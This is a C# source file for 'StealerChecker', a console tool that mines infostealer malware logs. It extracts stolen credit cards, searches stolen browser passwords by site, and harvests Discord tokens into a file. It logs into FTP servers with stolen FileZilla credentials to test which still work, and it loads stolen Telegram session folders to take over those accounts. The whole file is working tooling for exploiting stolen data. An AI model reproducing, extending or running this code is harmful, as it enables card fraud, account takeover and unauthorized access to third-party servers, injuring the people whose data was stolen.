using CommandLine;
using FluentFTP;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;
using TemnijExt;
using Console = Colorful.Console;

namespace stealerchecker
{
    static class Program
    {
        public class Options
        {
            [Option('p', "path", Required = true, HelpText = "Path to folder with logs")]
            public string Path { get; set; }

            [Option('v', "verbose", Required = false, HelpText = "Passwords view verbose mode")]
            public bool Verbose { get; set; }
        }

        #region FIELDS

        const string caption = "StealerChecker v6 by Temnij";
        static string path;
        static List<string> files = new();
        static List<string> directories = new();
        static bool Verbose;

        #endregion

        static void Main(string[] args)
        {
            SetStatus();
            #region ARGUMENT PARSING

            Parser.Default.ParseArguments<Options>(args)
                   .WithParsed(o => { path = o.Path; Verbose = o.Verbose; });

            if (string.IsNullOrEmpty(path))
                Environment.Exit(-1);

            #endregion
            #region LOADING

            Console.WriteLine("Please wait, loading...", Color.LightCyan);

            SetStatus("Adding Directories...");
            AddDirectories();
            Console.WriteLine($"Directories added: {directories.Count}", Color.Gray);
            SetStatus("Adding files...");
            AddFiles();
            Console.WriteLine($"Files added: {files.Count}", Color.Gray);

            Console.Clear();
            SetStatus();

        #endregion

        again:
            Console.WriteLine();
            Console.WriteAscii("StealerChecker", Color.Pink);
            Console.WriteLine(caption, Color.Pink);
            Console.WriteLine();
            Console.WriteLine("1) Get CCs", Color.LightCyan);
            Console.WriteLine("2) Get FTPs", Color.LightCyan);
            Console.WriteLine("3) Get Discord tokens", Color.LightCyan);
            Console.WriteLine("4) Search passwords", Color.LightCyan);
            Console.WriteLine("5) Get Telegrams", Color.LightCyan);
            Console.WriteLine("6) Sort Logs by Date", Color.LightCyan);
            Console.WriteLine("88) Exit", Color.LightPink);
            Console.WriteLine($"99) VERBOSE: {Verbose}", Color.LightCyan);

            switch (int.Parse(Console.ReadLine()))
            {
                case 1: GetCC(); break;
                case 2: GetFTP(); break;
                case 3: GetDiscord(); break;
                case 4:
                    Console.WriteLine("Enter query", Color.LightSkyBlue);
                    SearchPasswords(Console.ReadLine());
                    break;
                case 5:
                    GetTelegram();
                    break;
                case 6:
                    SortLogs();
                    break;
                case 99:
                    Verbose = !Verbose;
                    Console.Clear();
                    break;
                case 88: Environment.Exit(0); break;
            }
            goto again;
        }

        #region FILES

        public static void AddDirectories()
        {
            foreach (var directory in Directory.GetDirectories(path, "*", SearchOption.AllDirectories))
                directories.Add(directory);
        }
        public static void AddFiles()
        {
            foreach (var dir in directories)
                foreach (var file in Directory.GetFiles(dir))
                    if (Path.GetFileName(file) == "InfoHERE.txt")
                        files.Add(file);
        }

        #endregion
        #region CCs

        public static void GetCC()
        {
            foreach (var file in files)
            {
                SetStatus($"Working... file {files.IndexOf(file)} of {files.Count}");
                var match = Regex.Match(File.ReadAllText(file), @"∟💳(\d*)");
                var cards = int.Parse(match.Groups[1].Value);

                if (cards != 0)
                {
                    Console.Write($"[{file}]", Color.Green);
                    Console.WriteLine($" - {cards} cards!");

                    Console.WriteLine(WriteCC(file));
                }
            }
            SetStatus();
        }
        public static string WriteCC(string path)
        {
            var returned = "";

            var filecl = FileCl.Load(path);
            var dir = filecl.Info.Directory.FullName;
            var cardsFolder = Path.Combine(dir, "Browsers", "Cards");

            foreach (var file in Directory.GetFiles(cardsFolder))
            {
                var thisFile = FileCl.Load(file);
                if (thisFile.Info.Length > 5)
                    returned += thisFile.GetContent() + Environment.NewLine;
            }

            return returned;
        }

        #endregion
        #region FTPs

        public static void GetFTP()
        {
            foreach (var file in files)
            {
                SetStatus($"Working... file {files.IndexOf(file)} of {files.Count}");
                var match = Regex.Match(File.ReadAllText(file), @"📡 FTP\s*∟ FileZilla: (❌|✅).*\s*∟ TotalCmd: (❌|✅).*");

                var fileZila = match.Groups[1].Value == "✅";
                var totalCmd = match.Groups[2].Value == "✅";

                if (fileZila)
                {
                    Console.Write($"[{file}]", Color.Green);
                    Console.WriteLine(" - FileZila");

                    WriteFileZila(file);
                }
                if (totalCmd)
                {
                    Console.Write($"[{file}]", Color.Green);
                    Console.WriteLine(" - Total Commander");

                    Console.WriteLine(WriteTotalCmd(file));
                }
            }
            SetStatus();
        }
        public static void WriteFileZila(string path)
        {
            var filecl = FileCl.Load(path);
            var dir = filecl.Info.Directory.FullName;
            var fileZilaFolder = Path.Combine(dir, "FileZilla");

            foreach (var file in Directory.GetFiles(fileZilaFolder))
            {
                var thisFile = FileCl.Load(file);
                if (thisFile.Info.Length > 5)
                    CheckFileZilla(thisFile.GetContent());
                Console.WriteLine();
            }
        }
        public static void CheckFileZilla(string fileZillaLog)
        {
            const string pattern = @"Host: (.*)\s*Port: (.*)\s*User: (.*)\s*Pass: (.*)";
            foreach (Match match in Regex.Matches(fileZillaLog, pattern))
            {
                string
                    Host = match.Groups[1].Value.Replace("\r", "").Replace("\\r", ""),
                    Port = match.Groups[2].Value.Replace("\r", "").Replace("\\r", ""),
                    User = match.Groups[3].Value.Replace("\r", "").Replace("\\r", ""),
                    Pass = match.Groups[4].Value.Replace("\r", "").Replace("\\r", "");

                try
                {
                    SetStatus($"Checking {Host}...");
                    FtpClient client = new(Host)
                    {
                        Port = int.Parse(Port),
                        Credentials = new NetworkCredential(User, Pass),
                        ConnectTimeout = 5000,
                        DataConnectionConnectTimeout = 5000,
                        DataConnectionReadTimeout = 5000,
                        ReadTimeout = 5000
                    };

                    client.Connect();
                    client.Disconnect();

                    Console.WriteLine($"{Host}:{Port};{User}:{Pass} - GOOD", Color.LightGreen);
                }
                catch (FtpAuthenticationException)
                {
                    try
                    {
                        SetStatus($"Checking for anonymous auth {Host}...");
                        FtpClient client = new(Host)
                        {
                            Port = int.Parse(Port),
                            Credentials = new NetworkCredential("anonymous", ""),
                            ConnectTimeout = 5000,
                            DataConnectionConnectTimeout = 5000,
                            DataConnectionReadTimeout = 5000,
                            ReadTimeout = 5000
                        };

                        client.Connect();
                        client.Disconnect();

                        Console.WriteLine($"{Host}:{Port};{User}:{Pass} - GOOD (ANON)", Color.LightGreen);
                    }
                    catch
                    {
                        Console.WriteLine($"{Host}:{Port};{User}:{Pass} - BAD", Color.LightPink);
                    }
                }
                catch
                {
                    Console.WriteLine($"{Host}:{Port};{User}:{Pass} - BAD", Color.LightPink);
                }
            }
        }
        public static string WriteTotalCmd(string path)
        {
            var returned = "";

            var filecl = FileCl.Load(path);
            var dir = filecl.Info.Directory.FullName;
            var totalCmdDir = Path.Combine(dir, "FTP", "Total Commander");

            foreach (var file in Directory.GetFiles(totalCmdDir))
            {
                var thisFile = FileCl.Load(file);
                if (thisFile.Info.Length > 5)
                    returned += thisFile.GetContent() + Environment.NewLine;
            }

            return returned;
        }

        #endregion
        #region DISCORD

        public static void GetDiscord()
        {
            foreach (var file in files)
            {
                SetStatus($"Working... file {files.IndexOf(file)} of {files.Count}");
                var match = Regex.Match(File.ReadAllText(file), "💬 Discord: (✅|❌)");

                var discord = match.Groups[1].Value == "✅";

                if (discord)
                    WriteDiscord(file);
            }
            SetStatus();
        }
        public static void WriteDiscord(string path)
        {
            var filecl = FileCl.Load(path);
            var dir = filecl.Info.Directory.FullName;
            var discordDir = Path.Combine(dir, "Discord", "Local Storage", "leveldb");

            var tokensGlobal = new List<string>();
            foreach (var file in Directory.GetFiles(discordDir))
            {
                var thisFile = FileCl.Load(file);
                if (thisFile.Info.Length > 5)
                {
                    var tokens = CheckDiscord(thisFile.GetContent());
                    if (tokens.Count != 0)
                    {
                        Console.WriteLine();
                        var newfile = "";
                        if (File.Exists(file))
                            newfile = FileCl.Load(file).Info.Directory.Parent.Parent.Parent.FullName;

                        Console.Write($"[{newfile}]", Color.Green);
                        Console.WriteLine(" - Discord");
                    }

                    foreach (var token in tokens)
                        if (!tokensGlobal.Contains(token))
                        {
                            Console.WriteLine($"\t{token}", Color.LightGreen);

                            using var stream = new StreamWriter("DiscordTokens.txt", true);
                            stream.WriteLine(token);
                        }

                    tokensGlobal.AddRange(tokens);
                }
                var fileCl = FileCl.Load("DiscordTokens.txt");
                fileCl.SetContent(fileCl.GetLines().Distinct());
            }
        }
        public static List<string> CheckDiscord(string content)
        {
            var tokens = new List<string>();
            foreach (Match match in Regex.Matches(content, "[^\"]*"))
                if (match.Length == 59 && match.Value.StartsWith("N") && Regex.IsMatch(match.Value, @"[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}"))
                    tokens.Add(match.Value);

            tokens.Distinct();
            return tokens;
        }

        #endregion
        #region PASSWORDS

        public static void SearchPasswords(string query)
        {
            foreach (var file in files)
            {
                SetStatus($"Working... file {files.IndexOf(file)} of {files.Count}");
                var match = Regex.Match(File.ReadAllText(file), @"   ∟🔑\s*∟Chromium v1: (\d*)\s*∟Chromium v2: (\d*)\s*∟Edge: (\d*)\s*∟Gecko: (\d*)");

                int
                    chromiumv1 = int.Parse(match.Groups[1].Value),
                    chromiumv2 = int.Parse(match.Groups[2].Value),
                    edge = int.Parse(match.Groups[3].Value),
                    gecko = int.Parse(match.Groups[4].Value);

                if (chromiumv1 != 0 || chromiumv2 != 0
                    || edge != 0 || gecko != 0)
                    foreach (var password in SearchPasswords(file, query).Distinct())
                        Console.WriteLine(password, Color.LightGreen);
            }
            SetStatus();
        }
        public static List<string> SearchPasswords(string path, string query)
        {
            var pas = new List<string>();
            var filecl = FileCl.Load(path);
            var dir = filecl.Info.Directory.FullName;
            var passwordsDir = Path.Combine(dir, "Browsers", "Passwords");

            foreach (var file in Directory.GetFiles(passwordsDir))
            {
                var thisFile = FileCl.Load(file);

                if (thisFile.Info.Name == "ChromiumV2.txt")
                {
                    foreach (var pass in Regex.Split(thisFile.GetContent(), "============================="))
                    {
                        var log = Regex.Match(pass, @"Url: (.*)\s*Username: (.*)\s*Password: (.*)\s*Application: (.*)");

                        string
                            Url = log.Groups[1].Value.Replace("\r", "").Replace("\\r", ""),
                            Username = log.Groups[2].Value.Replace("\r", "").Replace("\\r", ""),
                            Password = log.Groups[3].Value.Replace("\r", "").Replace("\\r", "");

                        if (Url.Contains(query))
                        {
                            if (Username?.Length == 0 || Password?.Length == 0)
                                continue;

                            if (Verbose)
                                pas.Add($"{Username}:{Password}\t{Url}");
                            else
                                pas.Add($"{Username}:{Password}");
                        }
                    }
                }
                if (thisFile.Info.Name == "Passwords_Google.txt")
                {
                    foreach (var pass in Regex.Split(thisFile.GetContent(), "----------------------------------------"))
                    {
                        var log = Regex.Match(pass, @"Url: (.*)\s*Login: (.*)\s*Password: (.*)\s*Browser: (.*)");

                        string
                            Url = log.Groups[1].Value.Replace("\r", "").Replace("\\r", ""),
                            Username = log.Groups[2].Value.Replace("\r", "").Replace("\\r", ""),
                            Password = log.Groups[3].Value.Replace("\r", "").Replace("\\r", "");

                        if (Url.Contains(query))
                        {
                            if (Username?.Length == 0 || Password?.Length == 0)
                                continue;

                            if (Verbose)
                                pas.Add($"{Username}:{Password}\t{Url}");
                            else
                                pas.Add($"{Username}:{Password}");
                        }
                    }
                }
                if (thisFile.Info.Name == "Passwords_Mozilla.txt")
                {
                    foreach (var pass in Regex.Split(thisFile.GetContent().Replace("\r", ""), "\n\n"))
                    {
                        var log = Regex.Match(pass, @"URL : (.*)\s*Login: (.*)\s*Password: (.*)");

                        string
                            Url = log.Groups[1].Value.Replace("\r", "").Replace("\\r", ""),
                            Username = log.Groups[2].Value.Replace("\r", "").Replace("\\r", ""),
                            Password = log.Groups[3].Value.Replace("\r", "").Replace("\\r", "");

                        if (Url.Contains(query))
                        {
                            if (Username?.Length == 0 || Password?.Length == 0)
                                continue;

                            if (Verbose)
                                pas.Add($"{Username}:{Password}\t{Url}");
                            else
                                pas.Add($"{Username}:{Password}");
                        }
                    }
                }
                if (thisFile.Info.Name == "Passwords_Opera.txt")
                {
                    foreach (var pass in Regex.Split(thisFile.GetContent(), "----------------------------------------"))
                    {
                        var log = Regex.Match(pass, @"Url: (.*)\s*Login: (.*)\s*Passwords: (.*)");

                        string
                            Url = log.Groups[1].Value.Replace("\r", "").Replace("\\r", ""),
                            Username = log.Groups[2].Value.Replace("\r", "").Replace("\\r", ""),
                            Password = log.Groups[3].Value.Replace("\r", "").Replace("\\r", "");

                        if (Url.Contains(query))
                        {
                            if (Username?.Length == 0 || Password?.Length == 0)
                                continue;

                            if (Verbose)
                                pas.Add($"{Username}:{Password}\t{Url}");
                            else
                                pas.Add($"{Username}:{Password}");
                        }
                    }
                }
                if (thisFile.Info.Name == "Passwords_Unknown.txt")
                {
                    foreach (var pass in Regex.Split(thisFile.GetContent(), "----------------------------------------"))
                    {
                        var log = Regex.Match(pass, @"Url: (.*)\s*Login: (.*)\s*Password: (.*)");

                        string
                            Url = log.Groups[1].Value.Replace("\r", "").Replace("\\r", ""),
                            Username = log.Groups[2].Value.Replace("\r", "").Replace("\\r", ""),
                            Password = log.Groups[3].Value.Replace("\r", "").Replace("\\r", "");

                        if (Url.Contains(query))
                        {
                            if (Username?.Length == 0 || Password?.Length == 0)
                                continue;

                            if (Verbose)
                                pas.Add($"{Username}:{Password}\t{Url}");
                            else
                                pas.Add($"{Username}:{Password}");
                        }

                    }
                }
            }

            return pas;
        }

        #endregion
        #region TELEGRAM

        public static int counter = 0;

        public static void GetTelegram()
        {
            if (!Directory.Exists("Telegram"))
            {
                foreach (var file in files)
                {
                    var match = Regex.Match(File.ReadAllText(file), "✈️ Telegram: (❌|✅)");

                    if (match.Groups[1].Value == "✅")
                        CopyTelegram(file);
                }
            }

        again:
            var dirs = new List<string>();
            foreach (var dir in Directory.GetDirectories("Telegram"))
                dirs.Add(new DirectoryInfo(dir).Name);
            foreach (var dir in dirs)
                Console.WriteLine(dir, Color.LightGreen);

            Console.WriteLine("Select Telegram:", Color.Green);
            var select = int.Parse(Console.ReadLine());

            try { Directory.Delete("tdata"); } catch { }

            SetStatus("Copying Telegram session");
            CopyFilesRecursively(Path.Combine("Telegram", select.ToString()), "tdata");
            SetStatus();

            Process.Start("Telegram.exe");

            Console.ReadLine();

            foreach (var process in Process.GetProcessesByName("Telegram"))
                process.Kill();

            goto again;
        }
        public static void CopyTelegram(string path)
        {
            var filecl = FileCl.Load(path);
            var dir = filecl.Info.Directory.FullName;
            var tgDir = "";

            foreach (var tempDir in Directory.GetDirectories(dir))
                if (new DirectoryInfo(tempDir).Name.StartsWith("Telegram"))
                    tgDir = tempDir;

            CopyFilesRecursively(tgDir, Path.Combine(Directory.GetCurrentDirectory(), "Telegram", counter.ToString()));
            counter++;
            Console.Title = $"{counter} telegram dirs copied";
        }

        private static void CopyFilesRecursively(string sourcePath, string targetPath)
        {
            foreach (string dirPath in Directory.GetDirectories(sourcePath, "*", SearchOption.AllDirectories))
                Directory.CreateDirectory(dirPath.Replace(sourcePath, targetPath));

            foreach (string newPath in Directory.GetFiles(sourcePath, "*.*", SearchOption.AllDirectories))
                File.Copy(newPath, newPath.Replace(sourcePath, targetPath), true);
        }

        #endregion
        #region SORT LOGS

        public static void SortLogs()
        {
            List<KeyValuePair<string, DateTime>> result = new();
            Console.WriteLine("Loading...", Color.DarkCyan);

            foreach (var file in files)
            {

                var filecl = FileCl.Load(file);
                var dir = filecl.Info.Directory.FullName;
                var sysFile = Path.Combine(dir, "System_Information.txt");
                var matchRus = Regex.Match(File.ReadAllText(sysFile), @"Current time Utc: ((\d*)\.(\d*)\.(\d*) (\d*):(\d*):(\d*))");
                var matchEur = Regex.Match(File.ReadAllText(sysFile), @"Current time Utc: ((\d*)\/(\d*)\/(\d*) (\d*):(\d*):(\d*) (AM|PM))");
                DateTime date = DateTime.Now;


                if (matchRus.Success)
                {
                    try
                    {
                        date = DateTime.Parse(matchRus.Groups[1].Value);
                        result.Add(new KeyValuePair<string, DateTime>(dir, date));
                    }
                    catch
                    {
                        throw;
                    }
                }

                if (matchEur.Success)
                {
                    try
                    {
                        date = DateTime.ParseExact(matchEur.Groups[1].Value, "M/d/yyyy h:mm:ss tt", CultureInfo.InvariantCulture);
                        result.Add(new KeyValuePair<string, DateTime>(dir, date));
                    }
                    catch
                    {
                        throw;
                    }
                }
            }

            Console.WriteLine("Loaded!", Color.LightGreen);
            Console.WriteLine();
            Console.WriteLine("Sorting by Year/Month...", Color.DarkCyan);

            if (!Directory.Exists("Sorts"))
                Directory.CreateDirectory("Sorts");
            else
            {
                Console.WriteLine("Directory exists, deleting...", Color.Pink);
                deleteFolder("Sorts");
                Console.WriteLine("Deleted!", Color.LightGreen);
                Directory.CreateDirectory("Sorts");
            }

            foreach (var pair in result)
            {
                var date = pair.Value;
                var directory = pair.Key;
                var year = date.Year.ToString();
                var month = date.Month.ToString();

                if (!Directory.Exists(Path.Combine("Sorts", year)))
                    Directory.CreateDirectory(Path.Combine("Sorts", year));
                if (!Directory.Exists(Path.Combine("Sorts", year, month)))
                    Directory.CreateDirectory(Path.Combine("Sorts", year, month));

                CopyFilesRecursively(directory, Path.Combine("Sorts", year, month, new DirectoryInfo(directory).Name));
                SetStatus($"Copying... Directory {result.IndexOf(pair)}/{result.Count}");
            }
            SetStatus();

            Console.WriteLine("Sorted!", Color.Green);
        }
        static void deleteFolder(string folder)
        {
            try
            {
                DirectoryInfo di = new(folder);
                DirectoryInfo[] diA = di.GetDirectories();
                foreach (FileInfo f in di.GetFiles())
                    f.Delete();

                foreach (DirectoryInfo df in diA)
                {
                    deleteFolder(df.FullName);
                    if (df.GetDirectories().Length == 0 && df.GetFiles().Length == 0) df.Delete();
                }
            }

            catch (DirectoryNotFoundException ex)
            {
                Console.WriteLine("Директория не найдена. Ошибка: " + ex.Message);
            }
            catch (UnauthorizedAccessException ex)
            {
                Console.WriteLine("Отсутствует доступ. Ошибка: " + ex.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Произошла ошибка. Обратитесь к разрабу. Ошибка: " + ex.Message);
            }
        }

        #endregion
        #region STATUS FUNCTIONS

        public static void SetStatus(string status)
        {
            Console.Title = caption + " | " + status;
        }

        public static void SetStatus()
        {
            Console.Title = caption;
        }

        #endregion
    }
}
